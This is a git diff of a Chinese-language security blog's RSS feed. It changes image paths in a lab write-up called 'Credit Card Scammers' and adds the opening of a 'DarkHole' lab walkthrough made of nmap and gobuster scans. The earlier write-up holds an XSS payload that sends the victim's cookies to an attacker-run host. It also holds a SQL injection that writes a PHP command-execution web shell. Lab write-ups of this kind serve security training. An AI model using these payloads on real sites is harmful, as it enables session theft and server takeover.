@@ -175,25 +175,55 @@ sudo nmap --min-rate 10000 -p- 10.10.10.31
 sudo nmap -sC -sT -sV -p22,80,443,9090 10.10.10.31 
 
 sudo nmap --script=vuln -p22,80,443,9090 10.10.10.31 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="aaa.png" alt="aaa.png"&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/aaa.png" alt="aaa.png"&gt;&lt;/p&gt;
 &lt;h2 id="gobuster-爆破目录"&gt;gobuster 爆破目录&lt;/h2&gt;
 &lt;p&gt;在漏洞扫描中发现了许多目录，因此进行更详细的目录爆破&lt;/p&gt;
 &lt;pre tabindex="0"&gt;&lt;code&gt;sudo gobuster dir -u http://10.10.10.33 -w /usr/share/wordlists/dirb/common.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="bbb.png" alt="bbb.png"&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/bbb.png" alt="bbb.png"&gt;&lt;/p&gt;
 &lt;h1 id="web-渗透"&gt;Web 渗透&lt;/h1&gt;
 &lt;p&gt;审计爆破的目录发现在 admin 下有一个登入界面&lt;/p&gt;
-&lt;p&gt;&lt;img src="ccc.png" alt="ccc.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/ccc.png" alt="ccc.png"&gt;&lt;/p&gt;
 &lt;p&gt;默认界面能找到提交表单&lt;/p&gt;
-&lt;p&gt;&lt;img src="ddd.png" alt="ddd.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/ddd.png" alt="ddd.png"&gt;&lt;/p&gt;
 &lt;p&gt;尝试 XSS&lt;/p&gt;
 &lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;script&amp;gt;new Image().src=&amp;#34;http://10.10.10.5/?c=&amp;#34;+document.cookie;&amp;lt;/script&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="ee.png" alt="ee.png"&gt;&lt;/p&gt;
 &lt;p&gt;kali 架设连接&lt;/p&gt;
 &lt;pre tabindex="0"&gt;&lt;code&gt;python3 -m http.server 80
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="fff.png" alt="fff.png"&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/fff.png" alt="fff.png"&gt;&lt;/p&gt;
 &lt;p&gt;修改 cookie 登入&lt;/p&gt;
-&lt;p&gt;&lt;img src="ggg.png" alt="ggg.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/ggg.png" alt="ggg.png"&gt;&lt;/p&gt;
 &lt;p&gt;注入 sql 反弹 shell&lt;/p&gt;
 &lt;pre tabindex="0"&gt;&lt;code&gt;SELECT &amp;#34;&amp;lt;?php passthru($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&amp;#34; INTO DUMPFILE &amp;#39;/var/www/html/shell.php&amp;#39;
 &lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;http://10.10.10.33/shell.php?cmd=pwd
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="hhh.png" alt="hhh.png"&gt;&lt;/p&gt;</description></item></channel></rss>
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/hhh.png" alt="hhh.png"&gt;&lt;/p&gt;</description></item><item><title>DarkHole Writeup</title><link>https://enilmalus.github.io/posts/darkhole-writeup/</link><pubDate>Sat, 10 May 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/darkhole-writeup/</guid><description>&lt;blockquote&gt;
+&lt;p&gt;此文章以 kali 地址为 10.10.10.5 为示例&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id="darkhole-靶场"&gt;DarkHole 靶场&lt;/h1&gt;
+&lt;h2 id="主机发现"&gt;主机发现&lt;/h2&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap -sn 10.10.10.0/24
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="aaa.png" alt="aaa"&gt;&lt;/p&gt;
+&lt;p&gt;靶机的主机为 10.10.10.9&lt;/p&gt;
+&lt;h2 id="服务识别"&gt;服务识别&lt;/h2&gt;
+&lt;p&gt;使用 nmap 对靶机进行扫描，寻找靶机开放的端口以便于进行更进一步的渗透测试&lt;/p&gt;
+&lt;p&gt;扫描开放的端口&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap --min-rate 10000 -p- 10.10.10.9
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="bbb.png" alt="bbb"&gt;&lt;/p&gt;
+&lt;p&gt;扫描开放端口的基本信息，并将结果保存到本地以便于随时观看&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap -sT -sC -sV -p22,80 10.10.10.9 -oA nmap/Scan
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="ccc.png" alt="ccc"&gt;&lt;/p&gt;
+&lt;p&gt;使用 nmap 进行默认的漏洞脚本扫描，并将结果保存到本地&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap --script=vuln -p22,80 10.10.10.9 -oA nmap/Script
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="ddd.png" alt="ddd"&gt;&lt;/p&gt;
+&lt;p&gt;发现暴露出了很多目录，执行一下完整的目录爆破&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo gobuster dir -u /usr/share/dirb/wordlists/common.txt 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="eeee.png" alt="eeee"&gt;&lt;/p&gt;
+&lt;p&gt;除了 index.php 其他都是文件目录，
+upload 可能是文件上传的目录&lt;/p&gt;
+&lt;p&gt;&lt;img src="fff.png" alt="fff"&gt;&lt;/p&gt;
+&lt;h2 id="web渗透"&gt;WEB渗透&lt;/h2&gt;
+&lt;h3 id="80-端口渗透"&gt;80 端口渗透&lt;/h3&gt;
+&lt;p&gt;打开 80 页面&lt;/p&gt;
+&lt;p&gt;&lt;img src="ggg.png" alt="ggg"&gt;&lt;/p&gt;
+&lt;p&gt;View Details 点击没反应，
+进入 Login 页面&lt;/p&gt;</description></item></channel></rss>
